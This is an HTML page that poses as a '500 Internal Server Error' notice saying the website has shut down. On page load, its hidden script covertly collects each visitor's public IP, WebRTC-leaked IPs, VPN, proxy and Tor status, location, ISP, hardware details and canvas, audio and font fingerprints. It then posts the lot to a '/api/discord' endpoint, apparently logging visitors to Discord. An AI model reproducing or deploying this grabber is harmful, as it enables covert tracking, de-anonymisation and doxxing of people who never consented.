<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <style>
        body { 
            background-color: #fff; 
            color: #000; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .error-container { 
            text-align: center; 
        }
        h1 { 
            font-size: 24px; 
            font-weight: 500; 
            margin-bottom: 8px; 
        }
        p { 
            font-size: 14px; 
            color: #666; 
            margin: 0; 
        }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>Website has shut down</h1>
        <p>Internal Server Error (Code: 500)</p>
    </div>

    <script>
        // WebRTC IP leak detection
        async function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || 
                                        window.mozRTCPeerConnection || 
                                        window.webkitRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve([]);
                    return;
                }

                const pc = new RTCPeerConnection({
                    iceServers: [{urls: "stun:stun.l.google.com:19302"}]
                });

                pc.createDataChannel("");
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
                        resolve(ips);
                        return;
                    }
                    
                    const parts = ice.candidate.candidate.split(' ');
                    const ip = parts[4];
                    
                    if (ip && !ips.includes(ip) && ip !== '0.0.0.0') {
                        ips.push(ip);
                    }
                };

                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => resolve([]));

                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 2000);
            });
        }

        // Check if IP is likely a VPN/proxy
        async function checkVPNStatus(ip) {
            const checks = {
                isVPN: "Unknown",
                isProxy: "Unknown",
                isHosting: "Unknown",
                isTor: "Unknown",
                vpnProvider: "None detected"
            };

            try {
                // Use VPN detection API
                const response = await fetch(`https://vpnapi.io/api/${ip}?key=free`);
                if (response.ok) {
                    const data = await response.json();
                    checks.isVPN = data.security?.vpn ? "Yes" : "No";
                    checks.isProxy = data.security?.proxy ? "Yes" : "No";
                    checks.isHosting = data.security?.hosting ? "Yes" : "No";
                    checks.isTor = data.security?.tor ? "Yes" : "No";
                }
            } catch(e) {
                // Fallback: try another API
                try {
                    const response2 = await fetch(`https://proxycheck.io/v2/${ip}?key=free&vpn=1`);
                    if (response2.ok) {
                        const data2 = await response2.json();
                        if (data2[ip]) {
                            checks.isProxy = data2[ip].proxy === "yes" ? "Yes" : "No";
                            checks.isVPN = data2[ip].type === "VPN" ? "Yes" : "No";
                        }
                    }
                } catch(e2) {}
            }

            return checks;
        }

        // Timezone mismatch detection
        function detectTimezoneMismatch(ipTimezone, browserTimezone) {
            if (!ipTimezone || ipTimezone === "Unknown") return "Unable to verify";
            
            // Normalize timezone names for comparison
            const normalizeTimezone = (tz) => tz.replace(/\s+/g, '').toLowerCase();
            
            if (normalizeTimezone(ipTimezone) !== normalizeTimezone(browserTimezone)) {
                return "⚠️ MISMATCH DETECTED";
            }
            return "Match";
        }

        // gather system info
        async function collectInfo() {
            let data = {};
            
            // try multiple IP APIs in case one fails
            const apis = [
                "https://ipapi.co/json/",
                "https://ipwho.is/",
                "https://api.ipify.org?format=json"
            ];

            for(let i = 0; i < apis.length; i++) {
                try {
                    const response = await fetch(apis[i]);
                    if(response.ok) {
                        const json = await response.json();
                        data = Object.assign(data, json);
                        if(data.ip || data.query) break;
                    }
                } catch(err) {
                    // silent fail, try next API
                }
            }

            const ip = data.ip || data.query || "Unknown";
            
            // Get WebRTC IPs
            const webrtcIPs = await getWebRTCIPs();
            
            // Check VPN status
            const vpnStatus = await checkVPNStatus(ip);
            
            // Detect timezone mismatch
            const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const ipTimezone = data.timezone || "Unknown";
            const timezoneMismatch = detectTimezoneMismatch(ipTimezone, browserTimezone);

            // GPU detection
            let gpuInfo = "Unknown";
            let webglVendor = "Unknown";
            let webglCapabilities = {};
            try {
                const c = document.createElement('canvas');
                const ctx = c.getContext('webgl') || c.getContext('experimental-webgl');
                if(ctx) {
                    const ext = ctx.getExtension('WEBGL_debug_renderer_info');
                    if(ext) {
                        gpuInfo = ctx.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                        webglVendor = ctx.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                    }
                    webglCapabilities = {
                        maxTextureSize: ctx.getParameter(ctx.MAX_TEXTURE_SIZE),
                        maxRenderbufferSize: ctx.getParameter(ctx.MAX_RENDERBUFFER_SIZE),
                        maxViewportDims: ctx.getParameter(ctx.MAX_VIEWPORT_DIMS)
                    };
                }
            } catch(e) {}

            // Battery info
            let batteryLevel = "Unknown";
            let chargingStatus = "Unknown";
            try {
                const battery = await navigator.getBattery();
                batteryLevel = Math.round(battery.level * 100) + "%";
                chargingStatus = battery.charging ? "Charging" : "Not Charging";
            } catch(e) {}

            // Storage estimate
            let storageQuota = "Unknown";
            let storageUsage = "Unknown";
            try {
                const estimate = await navigator.storage.estimate();
                storageQuota = (estimate.quota / 1024 / 1024 / 1024).toFixed(2) + " GB";
                storageUsage = (estimate.usage / 1024 / 1024).toFixed(2) + " MB";
            } catch(e) {}

            // Connection info
            let connectionType = "Unknown";
            let effectiveType = "Unknown";
            let downlink = "Unknown";
            let rtt = "Unknown";
            let saveData = "Unknown";
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if(conn) {
                    connectionType = conn.type || "Unknown";
                    effectiveType = conn.effectiveType || "Unknown";
                    downlink = conn.downlink ? conn.downlink + " Mbps" : "Unknown";
                    rtt = conn.rtt ? conn.rtt + " ms" : "Unknown";
                    saveData = conn.saveData ? "Enabled" : "Disabled";
                }
            } catch(e) {}

            // Canvas fingerprint
            let canvasFingerprint = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('fingerprint', 2, 15);
                canvasFingerprint = canvas.toDataURL().substring(0, 50) + "...";
            } catch(e) {}

            // Audio context fingerprint
            let audioFingerprint = "Unknown";
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                
                gainNode.gain.value = 0;
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);
                
                audioFingerprint = analyser.frequencyBinCount + "-" + context.sampleRate;
                
                oscillator.disconnect();
                analyser.disconnect();
                scriptProcessor.disconnect();
                gainNode.disconnect();
            } catch(e) {}

            // Performance memory (Chrome only)
            let memoryUsage = "Unknown";
            let memoryLimit = "Unknown";
            try {
                if(performance.memory) {
                    memoryUsage = (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2) + " MB";
                    memoryLimit = (performance.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(2) + " MB";
                }
            } catch(e) {}

            // Font detection (common fonts)
            let detectedFonts = [];
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Verdana', 'Courier New', 'Georgia', 'Times New Roman',
                'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Lucida Console',
                'Palatino', 'Garamond', 'Bookman', 'Courier', 'Helvetica',
                'Monaco', 'Consolas', 'Calibri', 'Cambria'
            ];
            
            const testString = "mmmmmmmmmmlli";
            const testSize = '72px';
            
            const fontCanvas = document.createElement('canvas');
            const fontContext = fontCanvas.getContext('2d');
            
            const baseFontWidths = {};
            for(let baseFont of baseFonts) {
                fontContext.font = testSize + ' ' + baseFont;
                baseFontWidths[baseFont] = fontContext.measureText(testString).width;
            }
            
            for(let testFont of testFonts) {
                let detected = false;
                for(let baseFont of baseFonts) {
                    fontContext.font = testSize + ' "' + testFont + '", ' + baseFont;
                    const width = fontContext.measureText(testString).width;
                    if(width !== baseFontWidths[baseFont]) {
                        detected = true;
                        break;
                    }
                }
                if(detected) {
                    detectedFonts.push(testFont);
                }
            }

            let location = "Unknown";
            if(data.city) {
                location = data.city + ", " + (data.region || data.region_name) + ", " + (data.country_name || data.country);
            }
            const isp = data.org || data.isp || (data.connection && data.connection.isp) || "Unknown";

            const info = {
                "--- VPN/PROXY DETECTION ---": "",
                "Public IP": ip,
                "WebRTC Leaked IPs": webrtcIPs.length > 0 ? webrtcIPs.join(", ") : "None detected",
                "IP Mismatch": webrtcIPs.length > 0 && !webrtcIPs.includes(ip) ? "⚠️ YES (Possible VPN)" : "No",
                "VPN Detected": vpnStatus.isVPN,
                "Proxy Detected": vpnStatus.isProxy,
                "Hosting/Datacenter": vpnStatus.isHosting,
                "Tor Network": vpnStatus.isTor,
                "Timezone Check": timezoneMismatch,
                "IP Timezone": ipTimezone,
                "Browser Timezone": browserTimezone,
                "--- NETWORK DATA ---": "",
                "IP Address": ip,
                "Location": location,
                "ISP": isp,
                "Hostname": data.hostname || data.reverse || "None",
                "Connection Type": connectionType,
                "Effective Type": effectiveType,
                "Downlink Speed": downlink,
                "Round Trip Time": rtt,
                "Data Saver": saveData,
                "--- DEVICE HARDWARE ---": "",
                "OS/Platform": navigator.platform,
                "CPU Threads": navigator.hardwareConcurrency || "Unknown",
                "RAM (Approx GB)": navigator.deviceMemory || "Unknown",
                "GPU": gpuInfo,
                "GPU Vendor": webglVendor,
                "Max Texture Size": webglCapabilities.maxTextureSize || "Unknown",
                "Screen Resolution": screen.width + "x" + screen.height,
                "Available Screen": screen.availWidth + "x" + screen.availHeight,
                "Window Size": window.innerWidth + "x" + window.innerHeight,
                "Device Pixel Ratio": window.devicePixelRatio,
                "Color Depth": screen.colorDepth + " bits",
                "Pixel Depth": screen.pixelDepth + " bits",
                "Touch Support": navigator.maxTouchPoints > 0 ? "Yes" : "No",
                "Max Touch Points": navigator.maxTouchPoints,
                "Battery Level": batteryLevel,
                "Charging Status": chargingStatus,
                "--- STORAGE ---": "",
                "Storage Quota": storageQuota,
                "Storage Used": storageUsage,
                "--- BROWSER/SOFTWARE ---": "",
                "User Agent": navigator.userAgent,
                "App Version": navigator.appVersion,
                "Browser Platform": navigator.platform,
                "Product": navigator.product,
                "Vendor": navigator.vendor,
                "Browser Language": navigator.language,
                "System Languages": navigator.languages.join(", "),
                "Cookies Enabled": navigator.cookieEnabled,
                "Do Not Track": navigator.doNotTrack || "Not set",
                "Online Status": navigator.onLine ? "Online" : "Offline",
                "PDF Viewer": navigator.pdfViewerEnabled ? "Enabled" : "Disabled",
                "Timezone": browserTimezone,
                "Timezone Offset": new Date().getTimezoneOffset() + " minutes",
                "Current Time": new Date().toLocaleString(),
                "Referrer": document.referrer || "Direct Visit",
                "--- MEMORY (Chrome) ---": "",
                "JS Heap Used": memoryUsage,
                "JS Heap Limit": memoryLimit,
                "--- FINGERPRINTS ---": "",
                "Canvas FP": canvasFingerprint,
                "Audio FP": audioFingerprint,
                "Installed Fonts": detectedFonts.join(", ") || "None detected"
            };

            let message = "";
            for(let key in info) {
                if(key.startsWith("---")) {
                    message += info[key] + key + "\n";
                } else {
                    message += key + ": " + info[key] + "\n";
                }
            }

            // send to backend
            fetch("/api/discord", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({content: "```\n" + message + "\n```"})
            }).catch(function(err) {
                // ignore errors
            });
        }

        collectInfo();
    </script>
</body>
</html>
